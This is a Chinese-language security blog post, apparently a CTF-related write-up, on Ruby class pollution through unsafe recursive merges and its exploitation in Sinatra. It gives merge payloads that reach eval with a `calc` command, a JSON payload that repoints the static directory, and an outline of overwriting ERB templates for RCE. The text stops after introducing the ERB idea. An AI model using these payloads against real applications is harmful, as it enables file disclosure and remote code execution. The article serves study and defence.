@@ -1,0 +1,641 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="John Doe" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>
+    
+      Ruby类污染及其在Sinatra框架下的利用 
+      
+      
+      |
+    
+     Hexo
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img no-lazy src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Oranges</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Ruby类污染及其在Sinatra框架下的利用</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2025-01-24 13:23:07
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/trick/" title="trick">
+                    #trick
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/security/" title="security">
+                    #security
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="浅析Ruby类污染及其在Sinatra框架下的利用"><a href="#浅析Ruby类污染及其在Sinatra框架下的利用" class="headerlink" title="浅析Ruby类污染及其在Sinatra框架下的利用"></a>浅析Ruby类污染及其在Sinatra框架下的利用</h1><p>和JavaScript中的原型链污染类似，Ruby中也存在类似的概念——类污染，两者都是对象进行不安全的递归合并导致的。</p>
+<p>网上也没有相关的分析文章，只有下面这篇文章应该是第一次谈到这个问题</p>
+<p><a target="_blank" rel="noopener" href="https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html">Class Pollution in Ruby: A Deep Dive into Exploiting Recursive Merges · Doyensec’s Blog</a></p>
+<p>刚打完的长城杯，ezruby一题应该就是基于这篇文章的进一步利用。</p>
+<h2 id="Ruby类介绍"><a href="#Ruby类介绍" class="headerlink" title="Ruby类介绍"></a>Ruby类介绍</h2><p>在Ruby中也是万物皆对象，下面定义一个Person类</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span></span><br><span class="line">  <span class="variable">@@cnt</span> = <span class="number">1</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment"># 定义属性</span></span><br><span class="line">  <span class="built_in">attr_accessor</span> <span class="symbol">:name</span>, <span class="symbol">:age</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 初始化方法</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">name, age</span>)</span><br><span class="line">    <span class="variable">@name</span> = name</span><br><span class="line">    <span class="variable">@age</span> = age</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 定义方法</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">greet</span></span><br><span class="line">    <span class="string">&quot;My name is <span class="subst">#&#123;<span class="variable">@name</span>&#125;</span> and I am <span class="subst">#&#123;<span class="variable">@age</span>&#125;</span> years old.&quot;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">person = <span class="title class_">Person</span>.new(<span class="string">&quot;Alice&quot;</span>, <span class="number">30</span>)</span><br><span class="line">puts person.greet</span><br></pre></td></tr></table></figure>
+
+<p>类变量（类似Java中类的静态变量）使用 <code>@@ </code>前缀，实例变量使用<code>@</code>前缀，在类内部才用这种前缀来访问。</p>
+<p>冒号前缀表示符号（Symbol）。Ruby中符号是轻量级的、不可变的字符串，通常用于表示标识符、方法名或键。符号的优点是它们在内存中只存储一次，因此在需要频繁比较或使用相同字符串的情况下，使用符号可以提高性能。</p>
+<p>Ruby对象的一些特殊的方法：</p>
+<ul>
+<li><code>attr_accessor</code>：定义实例变量的getter和setter方法，用于在类外部访问实例变量</li>
+<li><code>initialize</code>：类的构造方法</li>
+<li><code>to_s</code>：toString方法</li>
+<li><code>inspect</code>：和<code>to_s</code>差不多，常用于debug</li>
+<li><code>method_missing</code>：类似PHP的<code>__call__</code>方法，当调用一个不存在的方法时会触发</li>
+<li><code>respond_to?</code>：检测对象是否有某个方法或属性</li>
+<li><code>send</code>：根据方法名来调用（包括私有方法）</li>
+<li><code>public_send</code>：根据方法名调用公开方法</li>
+</ul>
+<p>Ruby对象的一些特殊的属性（类也算对象）</p>
+<ul>
+<li><code>class</code>：当前对象的类</li>
+<li><code>superclass</code>：父类</li>
+<li><code>subclasses</code>：子类数组</li>
+<li><code>instance_variables</code>：实例变量名的数组</li>
+<li><code>class_variables</code>：类变量名的数组</li>
+</ul>
+<p>当然不止这些，具体就不展开了。</p>
+<p>在 Ruby 中，所有类的顶层父类是 BasicObject。BasicObject 是 Ruby 类层次结构中的根类，所有其他类都直接或间接地继承自它。</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">puts <span class="title class_">MyClass</span>.superclass          <span class="comment"># Output: Object</span></span><br><span class="line">puts <span class="title class_">Object</span>.superclass           <span class="comment"># Output: BasicObject</span></span><br><span class="line">puts <span class="title class_">BasicObject</span>.superclass      <span class="comment"># Output: nil</span></span><br></pre></td></tr></table></figure>
+
+<p>在实际污染中，用到的就是<code>class</code>、<code>superclass</code>、<code>subclasses</code>，先从当前对象找到当前类，回溯到父类Object，锁定要污染的变量所在的类，在从父类一层层找子类。</p>
+<h2 id="不安全的递归合并"><a href="#不安全的递归合并" class="headerlink" title="不安全的递归合并"></a>不安全的递归合并</h2><p>Doyensec的文章中给出下面的merge函数，也介绍了两个实际案例，分别是<code>Ruby on Rails</code>的内置组件<code>ActiveSupport</code>提供的&#96;&#96;deep_merge<code>，以及</code>Hashie<code>库提供的</code>deep_merge&#96;，感兴趣可以看原文。</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">recursive_merge</span>(<span class="params">original, additional, current_obj = original</span>)</span><br><span class="line">  additional.each <span class="keyword">do</span> |<span class="params">key, value</span>|</span><br><span class="line">    <span class="keyword">if</span> value.is_a?(<span class="title class_">Hash</span>)</span><br><span class="line">      <span class="keyword">if</span> current_obj.respond_to?(key)</span><br><span class="line">        next_obj = current_obj.public_send(key)</span><br><span class="line">        recursive_merge(original, value, next_obj)</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        new_object = <span class="title class_">Object</span>.new</span><br><span class="line">        current_obj.instance_variable_set(<span class="string">&quot;@<span class="subst">#&#123;key&#125;</span>&quot;</span>, new_object)</span><br><span class="line">        current_obj.singleton_class.<span class="built_in">attr_accessor</span> key</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      current_obj.instance_variable_set(<span class="string">&quot;@<span class="subst">#&#123;key&#125;</span>&quot;</span>, value)</span><br><span class="line">      current_obj.singleton_class.<span class="built_in">attr_accessor</span> key</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  original</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+
+<p><code>recursive_merge</code>用于递归地合并两个对象<code>original</code>和<code>additional</code></p>
+<ol>
+<li>遍历<code> additional</code>对象中的每个键值对。</li>
+<li>处理嵌套的哈希：如果值是一个哈希，它会检查 <code>current_obj</code>（初始为 <code>original</code>）是否响应该键。如果响应，则递归合并嵌套的哈希。如果不响应，则创建一个新对象，将其设置为实例变量，并为其创建访问器。</li>
+<li>处理非哈希值：如果值不是哈希，则直接在 <code>current_obj</code> 上设置该值为实例变量，并为其创建访问器。</li>
+</ol>
+<p>下面举个例子</p>
+<h3 id="污染当前对象"><a href="#污染当前对象" class="headerlink" title="污染当前对象"></a>污染当前对象</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> A</span><br><span class="line"></span><br><span class="line">  <span class="built_in">attr_accessor</span> <span class="symbol">:x</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">x</span>)</span><br><span class="line">    <span class="variable">@x</span> = x</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">merge_with</span>(<span class="params">additional</span>)</span><br><span class="line">    recursive_merge(<span class="variable language_">self</span>, additional)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">check</span></span><br><span class="line">    protected_methods().each <span class="keyword">do</span> |<span class="params">method</span>|</span><br><span class="line">      instance_eval(method.to_s)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+
+<p>若能污染<code>protected_methods</code>，其返回值就能传入<code>instance_eval</code>进行代码执行。</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a = A.new(<span class="number">1</span>)</span><br><span class="line">a.merge_with(&#123;</span><br><span class="line">               <span class="string">&quot;protected_methods&quot;</span>: [<span class="string">&quot;`calc`&quot;</span>]</span><br><span class="line">             &#125;)</span><br><span class="line">a.check</span><br></pre></td></tr></table></figure>
+
+<p>当然这种污染的是当前的对象的属性，不影响父类以及其他实例对象。</p>
+<h3 id="污染父类"><a href="#污染父类" class="headerlink" title="污染父类"></a>污染父类</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span></span><br><span class="line">  <span class="variable">@@cmd</span> = <span class="string">&quot;puts 1&quot;</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cmder</span> &lt; <span class="title class_ inherited__">Base</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">merge_with</span>(<span class="params">additional</span>)</span><br><span class="line">    recursive_merge(<span class="variable language_">self</span>, additional)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">check</span></span><br><span class="line">    eval(<span class="title class_">Base</span>.cmd)</span><br><span class="line">    <span class="comment"># eval(@<span class="doctag">@cmd</span>)  污染失败</span></span><br><span class="line">    <span class="string">&quot;ok&quot;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+
+<p>对于这种情况，可以污染父类的cmd变量，但这里实际上是给父类Base增加了一个实例变量<code>@cmd</code>，从而通过<code>Base.cmd</code>访问时，实例变量<code>@cmd</code>遮盖了类变量<code>@@cmd</code></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="title class_">Cmder</span>.new</span><br><span class="line">c.merge_with(&#123;</span><br><span class="line">               <span class="string">&quot;class&quot;</span>: &#123;</span><br><span class="line">                 <span class="string">&quot;superclass&quot;</span>: &#123;</span><br><span class="line">                   <span class="string">&quot;cmd&quot;</span>: <span class="string">&quot;`calc`&quot;</span></span><br><span class="line">                 &#125;</span><br><span class="line">               &#125;</span><br><span class="line">             &#125;)</span><br><span class="line">c.check</span><br><span class="line">puts <span class="title class_">Base</span>.class_variables  <span class="comment"># @<span class="doctag">@cmd</span></span></span><br><span class="line">puts <span class="title class_">Base</span>.instance_variables  <span class="comment"># <span class="doctag">@cmd</span></span></span><br></pre></td></tr></table></figure>
+
+<h3 id="污染其他类"><a href="#污染其他类" class="headerlink" title="污染其他类"></a>污染其他类</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Cmder</span></span><br><span class="line">  <span class="variable">@@cmd</span> = <span class="string">&quot;puts 1&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">check</span></span><br><span class="line">    eval(<span class="title class_">Cmder</span>.cmd)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Innocent</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">merge_with</span>(<span class="params">additional</span>)</span><br><span class="line">    recursive_merge(<span class="variable language_">self</span>, additional)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+
+<p>能否通过<code>Innocent</code>污染到<code>Cmder</code>呢？</p>
+<p><code>subclasses</code>可以获取到Object的子类，但返回的是数组，可以利用数组的<code>sample</code>方法，随机返回一个元素</p>
+<p>通过多次污染，总有几率污染到<code>Cmder</code>这个子类</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1000</span>.times <span class="keyword">do</span></span><br><span class="line">  i = <span class="title class_">Innocent</span>.new</span><br><span class="line">  i.merge_with(&#123;</span><br><span class="line">                 <span class="string">&quot;class&quot;</span>: &#123;</span><br><span class="line">                   <span class="string">&quot;superclass&quot;</span>: &#123;</span><br><span class="line">                     <span class="string">&quot;subclasses&quot;</span>: &#123;</span><br><span class="line">                       <span class="string">&quot;sample&quot;</span>: &#123;</span><br><span class="line">                         <span class="string">&quot;cmd&quot;</span>: <span class="string">&quot;`calc`&quot;</span></span><br><span class="line">                       &#125;</span><br><span class="line">                     &#125;</span><br><span class="line">                   &#125;</span><br><span class="line">                 &#125;</span><br><span class="line">               &#125;)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">c = <span class="title class_">Cmder</span>.new</span><br><span class="line">c.check</span><br></pre></td></tr></table></figure>
+
+<p>Doyensec的文章中提到了污染<code>Person</code>的<code>url</code>变量来进行SSRF，以及污染<code>KeySigner</code>的<code>signing_key</code>变量来实现伪造签名数据。但我们追求的是通过类污染来实现RCE。</p>
+<p>注意文章中给出的情景，使用的是<code>Sinatra</code>这个web框架，能否污染框架中的关键变量来实现RCE或者文件读取之类的操作呢。</p>
+<h2 id="类污染设置静态目录"><a href="#类污染设置静态目录" class="headerlink" title="类污染设置静态目录"></a>类污染设置静态目录</h2><p><code>Sinatra</code>框架中是通过如下配置来设置静态目录的</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set <span class="symbol">:public_folder</span>, <span class="title class_">File</span>.dirname(<span class="variable constant_">__FILE__</span>) + <span class="string">&#x27;/static&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>跟进<code>set</code>方法可以发现他实际就是给<code>Sinatra::Base</code>设置了一个属性的getter、setter</p>
+<p><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/./../img/image-20241216225120158.png" alt="image-20241216225120158"></p>
+<p><code>class_eval</code>给类动态定义方法</p>
+<p><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/./../img/image-20241216225025363.png" alt="image-20241216225025363"></p>
+<p>因此可以污染<code>public_folder</code>这个属性来修改静态目录</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;class&quot;</span><span class="symbol">:</span>&#123;<span class="string">&quot;superclass&quot;</span><span class="symbol">:</span>&#123;<span class="string">&quot;superclass&quot;</span><span class="symbol">:</span>&#123;<span class="string">&quot;subclasses&quot;</span><span class="symbol">:</span>&#123;<span class="string">&quot;sample&quot;</span><span class="symbol">:</span>&#123;<span class="string">&quot;public_folder&quot;</span>: <span class="string">&quot;E:/Server&quot;</span>&#125;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="类污染写ERB模板"><a href="#类污染写ERB模板" class="headerlink" title="类污染写ERB模板"></a>类污染写ERB模板</h2><p>调试可知<code>Sinatra::Base</code>有个<code>templates</code>属性，类型是哈希，猜测他是存放模板的</p>
+<p><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/./../img/image-20241216230036346.png" alt="image-20241216230036346"></p>
+<p><code>Sinatra</code> 默认模板位于<code>./views</code>目录，也支持通过如下语句定义模板</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">template <span class="symbol">:index</span> <span class="keyword">do</span></span><br><span class="line">  <span class="string">&#x27;%div.title Hello World!&#x27;</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到<code>template</code>方法实际就是给<code>templates</code>这个属性赋值（block是个代码块，需要返回模板内容的字符串）</p>
+<p><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/./../img/image-20241216230313073.png" alt="image-20241216230313073"></p>
+<p>有如下渲染模板的路由</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">get(<span class="string">&#x27;/&#x27;</span>) <span class="keyword">do</span></span><br><span class="line">    erb <span class="symbol">:hello</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+
+<p>ERB (Embedded Ruby) 是 Ruby 标准库自带的，它允许在文本文件中嵌入 Ruby 代码，通常用于生成 HTML 文件，就是一个模板引擎。</p>
+<p>可以污染<code>templates</code>属性，覆盖<code>hello</code>模板，通过ERB模板实现RCE</p>
